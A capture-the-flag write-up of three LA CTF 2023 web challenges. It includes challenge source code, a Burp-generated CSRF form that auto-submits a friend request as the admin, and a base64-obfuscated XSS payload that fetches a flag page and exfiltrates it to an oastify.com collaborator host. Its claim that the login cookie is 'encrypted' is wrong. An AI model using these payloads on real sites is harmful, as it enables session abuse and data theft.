---
title: LA CTF 2023 - Writeup
author: H0j3n
date: 2023-02-11 00:00:00
categories: [ctf]
tags: [ctf,writeup]
render_with_liquid: false
---

### Category : Web

#### College Tour

> Welcome to UCLA! To explore the #1 public college, we have prepared a scavenger hunt for you to walk all around the beautiful campus.
>
> Link: college-tour.lac.tf

```bash
└─# curl -ks https://college-tour.lac.tf/ | tr " " "\n" | tr "\"" "\n" | grep -Ev "lOsT|\!N|number_text|03LT3r" | grep -i lactf
lactf{1_j03_4}-->
lactf{2_nd_j0}
lactf{4_n3_bR}.pdf
```

```bash
└─# curl -ks https://college-tour.lac.tf/index.css | tr " " "\n" | tr "\"" "\n" | grep -Ev "lOsT|\!N|number_text|03LT3r" | grep -i lactf
lactf{3_S3phI}
```

```bash
└─# curl -ks https://college-tour.lac.tf/script.js | tr " " "\n" | tr "\"" "\n" | grep -Ev "lOsT|\!N|number_text|03LT3r" | grep -i lactf
lactf{6_AY_hi}
cookie=lactf{5_U1n_s}
```

Flag: `lactf{j03_4nd_j0S3phIn3_bRU1n_sAY_hi}`

#### Metaverse

> Metaenter the metaverse and metapost about metathings. All you have to metado is metaregister for a metaaccount and you're good to metago.
>
> Link: metaverse.lac.tf
>
> You can metause our fancy new metaadmin metabot to get the admin to metaview your metapost!


```js
const express = require("express");
const path = require("path");
const fs = require("fs");
const cookieParser = require("cookie-parser");
const { v4: uuid } = require("uuid");

const flag = process.env.FLAG;
const port = parseInt(process.env.PORT) || 8080;
const adminpw = process.env.ADMINPW || "placeholder";

const accounts = new Map();
accounts.set("admin", {
    password: adminpw,
    displayName: flag,
    posts: [],
    friends: [],
});
const posts = new Map();

const app = express();

let cleanup = [];

setInterval(() => {
    const now = Date.now();
    let i = cleanup.findIndex((x) => now < x[1]);
    if (i === -1) {
        i = cleanup.length;
    }
    for (let j = 0; j < i; j++) {
        const account = accounts.get(cleanup[i][0]);
        for (const post of account.posts) {
            posts.delete(post);
        }
        accounts.delete(cleanup[i][0]);
    }
    cleanup = cleanup.slice(i);
}, 1000 * 60);

function needsAuth(req, res, next) {
    if (!res.locals.user) {
        res.redirect("/login");
    } else {
        next();
    }
}

app.use(cookieParser());
app.use(express.urlencoded({ extended: false }));
app.use((req, res, next) => {
    res.locals.user = null;
    if (req.cookies.login) {
        const chunks = req.cookies.login.split(":");
        if (chunks.length === 2 && accounts.has(chunks[0]) && accounts.get(chunks[0]).password === chunks[1]) {
            res.locals.user = chunks[0];
        }
    }
    next();
});

// templating engines are for losers!
const postTemplate = fs.readFileSync(path.join(__dirname, "post.html"), "utf8");
app.get("/post/:id", (req, res) => {
    if (posts.has(req.params.id)) {
        res.type("text/html").send(postTemplate.replace("$CONTENT", () => posts.get(req.params.id)));
    } else {
        res.status(400).type("text/html").send(postTemplate.replace("$CONTENT", "post not found :("));
    }
});

app.get("/", needsAuth);
app.get("/login", (req, res, next) => {
    if (res.locals.user) {
        res.redirect("/");
    } else {
        next();
    }
});
app.use(express.static(path.join(__dirname, "static"), { extensions: ["html"] }));

app.post("/register", (req, res) => {
    if (typeof req.body.username !== "string" || typeof req.body.password !== "string" || typeof req.body.displayName !== "string") {
        res.redirect("/login#" + encodeURIComponent("Please metafill out all the metafields."));
        return;
    }
    const username = req.body.username.trim();
    const password = req.body.password.trim();
    const displayName = req.body.displayName.trim();
    if (!/^[\w]{3,32}$/.test(username) || !/^[-\w !@#$%^&*()+]{3,32}$/.test(password) || !/^[-\w ]{3,64}/.test(displayName)) {
        res.redirect("/login#" + encodeURIComponent("Invalid metavalues provided for metafields."));
        return;
    }
    if (accounts.has(username)) {
        res.redirect("/login#" + encodeURIComponent("Metaaccount already metaexists."));
        return;
    }
    accounts.set(username, { password, displayName, posts: [], friends: [] });
    cleanup.push([username, Date.now() + 1000 * 60 * 60 * 12]);
    res.cookie("login", `${username}:${password}`, { httpOnly: true });
    res.redirect("/");
});

app.post("/login", (req, res) => {
    if (typeof req.body.username !== "string" || typeof req.body.password !== "string") {
        res.redirect("/login#" + encodeURIComponent("Please metafill out all the metafields."));
        return;
    }
    const username = req.body.username.trim();
    const password = req.body.password.trim();
    if (accounts.has(username) && accounts.get(username).password === password) {
        res.cookie("login", `${username}:${password}`, { httpOnly: true });
        res.redirect("/");
    } else {
        res.redirect("/login#" + encodeURIComponent("Wrong metausername/metapassword."));
    }
});

app.post("/friend", needsAuth, (req, res) => {
    res.type("text/plain");
    const username = req.body.username.trim();
    if (!accounts.has(username)) {
        res.status(400).send("Metauser doesn't metaexist");
    } else {
        const user = accounts.get(username);
        if (user.friends.includes(res.locals.user)) {
            res.status(400).send("Already metafriended");
        } else {
            user.friends.push(res.locals.user);
            res.status(200).send("ok");
        }
    }
});

app.post("/post", needsAuth, (req, res) => {
    res.type("text/plain");
    const id = uuid();
    const content = req.body.content;
    if (typeof content !== "string" || content.length > 1000 || content.length === 0) {
        res.status(400).send("Invalid metacontent");
    } else {
        const user = accounts.get(res.locals.user);
        posts.set(id, content);
        user.posts.push(id);
        res.send(id);
    }
});

app.get("/posts", needsAuth, (req, res) => {
    res.type("application/json");
    res.send(
        JSON.stringify(
            accounts.get(res.locals.user).posts.map((id) => {
                const content = posts.get(id);
                return {
                    id,
                    blurb: content.length < 50 ? content : content.slice(0, 50) + "...",
                };
            })
        )
    );
});

app.get("/friends", needsAuth, (req, res) => {
    res.type("application/json");
    res.send(
        JSON.stringify(
            accounts
                .get(res.locals.user)
                .friends.filter((username) => accounts.has(username))
                .map((username) => ({
                    username,
                    displayName: accounts.get(username).displayName,
                }))
        )
    );
});

app.listen(port, () => {
    console.log(`Listening on port ${port}`);
});
```

This code defines a simple web application using the Express framework in Node.js. The application allows users to register and log in, post updates, and view other users' posts.

The code sets up the following routes:

> `/post/:id`: This route displays the content of a post with the given ID.
{: .prompt-info }
> `/`: This route requires the user to be logged in and serves static HTML content.
{: .prompt-info }
> `/login`: This route serves static HTML content for the login page.
{: .prompt-info }
> `/register`: This route handles the user registration process.
{: .prompt-info }
> `/login`: This route handles the user login process.
{: .prompt-info }

The application uses `cookies` to keep track of the user who is currently logged in. The cookie is encrypted using the `username` and `password` of the user. The accounts variable is a `Map` that stores information about all registered users, including their username, password, display name, posts, and friends. The posts variable is also a Map that stores the content of all posts.

There is a timer that runs every minute and removes expired accounts and their posts from the Maps. The expiration time for an account is 12 hours after the account is created.

Payload CSRF:

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://metaverse.lac.tf/friend" method="POST">
      <input type="hidden" name="username" value="admin1" />
      <input type="submit" value="Submit request" />
    </form>
 <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

Send the URL to here: https://admin-bot.lac.tf/

Flag : `lactf{please_metaget_me_out_of_here}`


#### california-state-police

```js
const express = require("express");
const path = require("path");
const { v4: uuid } = require("uuid");
const cookieParser = require("cookie-parser");

const flag = process.env.FLAG;
const port = parseInt(process.env.PORT) || 8080;
const adminpw = process.env.ADMINPW || "placeholder";

const app = express();

const reports = new Map();

let cleanup = [];

setInterval(() => {
    const now = Date.now();
    let i = cleanup.findIndex(x => now < x[1]);
    if (i === -1) {
        i = cleanup.length;
    }
    for (let j = 0; j < i; j ++) {
        reports.delete(cleanup[j][0]);
    }
    cleanup = cleanup.slice(i);
}, 1000 * 60);

app.use(cookieParser());
app.use(express.urlencoded({ extended: false }));

app.get("/flag", (req, res) => {
    res.status(400).send("you have to POST the flag this time >:)");
});

app.post("/flag", (req, res) => {
    if (req.cookies.adminpw === adminpw) {
        res.send(flag);
    } else {
        res.status(400).send("no hacking allowed");
    }
});

app.use((req, res, next) => {
    res.set(
        "Content-Security-Policy",
        "default-src 'none'; script-src 'unsafe-inline'"
    );
    next();
});

app.post("/report", (req, res) => {
    res.type("text/plain");
    const crime = req.body.crime;
    if (typeof crime !== "string") {
        res.status(400).send("no crime provided");
        return;
    }
    if (crime.length > 2048) {
        res.status(400).send("our servers aren't good enough to handle that");
        return;
    }
    const id = uuid();
    reports.set(id, crime);
    cleanup.push([id, Date.now() + 1000 * 60 * 60 * 3]);
    res.redirect("/report/" + id);
});

app.get("/report/:id", (req, res) => {
    if (reports.has(req.params.id)) {
        res.type("text/html").send(reports.get(req.params.id));
    } else {
        res.type("text/plain").status(400).send("report doesn't exist");
    }
});

app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "index.html"));
});

app.listen(port, () => {
    console.log(`Listening on port ${port}`);
});

```

Payload:

```js
<script>
eval(atob("dmFyIHVybCA9ICJodHRwczovL2NhbGlmb3JuaWEtc3RhdGUtcG9saWNlLmxhYy50Zi9mbGFnIjsKdmFyIGF0dGFja2VyID0gImh0dHA6Ly9xZ2FnaXZlN3c3NXlkc2xnM2FzeGJsdXY5bWZkMzZydi5vYXN0aWZ5LmNvbS8iOwp2YXIgeGhyICA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOwp4aHIub25yZWFkeXN0YXRlY2hhbmdlID0gZnVuY3Rpb24oKSB7CiAgICBpZiAoeGhyLnJlYWR5U3RhdGUgPT0gWE1MSHR0cFJlcXVlc3QuRE9ORSkgewogICAgICAgIGZldGNoKGF0dGFja2VyICsgIj8iICsgZW5jb2RlVVJJKGJ0b2EoeGhyLnJlc3BvbnNlVGV4dCkpKQogICAgfQp9Cnhoci5vcGVuKCdHRVQnLCB1cmwsIHRydWUpOwp4aHIuc2VuZChudWxsKTs="))
</script>
```
